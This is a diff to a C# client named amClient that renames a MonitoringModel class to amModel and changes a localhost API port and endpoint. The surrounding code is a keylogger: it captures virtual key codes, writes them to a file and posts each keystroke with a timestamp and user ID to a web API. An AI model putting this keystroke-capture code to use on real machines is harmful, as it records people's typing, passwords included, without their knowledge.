@@ -41,8 +41,8 @@ namespace amClient
                 sw.Write((Keys)vkCode);
                 sw.Close();
 
-                var monitor = new MonitoringModel();
-                monitor.MonitoringModelId = Guid.NewGuid().ToString();
+                var monitor = new amModel();
+                monitor.amModelId = Guid.NewGuid().ToString();
                 monitor.KeyLogCatch = ((Keys)vkCode).ToString();
                 monitor.TimeStamp = DateTime.Now;
                 monitor.userID = "HWK";
@@ -93,25 +93,25 @@ namespace amClient
         static async Task RunAsync()
         {
             // New code:
-            client.BaseAddress = new Uri("http://localhost:65054");
+            client.BaseAddress = new Uri("http://localhost:59302");
             client.DefaultRequestHeaders.Accept.Clear();
             client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
         }
 
-        static async Task<MonitoringModel> GetMonitoringModelSampleData(string path)
+        static async Task<amModel> GetMonitoringModelSampleData(string path)
         {
-            MonitoringModel monitor = null;
+            amModel monitor = null;
             HttpResponseMessage response = await client.GetAsync(path);
             if (response.IsSuccessStatusCode)
             {
-                monitor = await response.Content.ReadAsAsync<MonitoringModel>();
+                monitor = await response.Content.ReadAsAsync<amModel>();
             }
             return monitor;
         }
 
-        static async Task<Uri> CreateMonitoringAsync(MonitoringModel monitor)
+        static async Task<Uri> CreateMonitoringAsync(amModel monitor)
         {
-            HttpResponseMessage response = await client.PostAsJsonAsync("api/monitoring", monitor);
+            HttpResponseMessage response = await client.PostAsJsonAsync("api/amController", monitor);
             response.EnsureSuccessStatusCode();
 
             // Return the URI of the created resource.
